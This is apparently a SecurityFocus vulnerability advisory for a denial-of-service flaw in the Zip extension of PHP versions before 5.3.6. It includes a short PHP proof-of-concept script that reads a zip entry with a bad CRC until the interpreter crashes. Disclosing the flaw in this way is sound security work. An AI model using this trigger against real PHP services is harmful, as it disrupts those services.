source: http://www.securityfocus.com/bid/46975/info

PHP is prone to a remote denial-of-service vulnerability that affects the 'Zip' extension.

Successful attacks will cause the application to crash, creating a denial-of-service condition. Due to the nature of this issue, arbitrary code-execution may be possible; however, this has not been confirmed.

Versions prior to PHP 5.3.6 are vulnerable. 

<?php
$o = new ZipArchive();
if (! $o->open('test.zip',ZipArchive::CHECKCONS)) {
	exit ('error can\'t open');
}
$o->getStream('file2'); // this file is ok
echo "OK";
$r = $o->getStream('file1'); // this file has a wrong crc
while (! feof($r)) {
	fread($r,1024);
}
echo "never here\n";
?>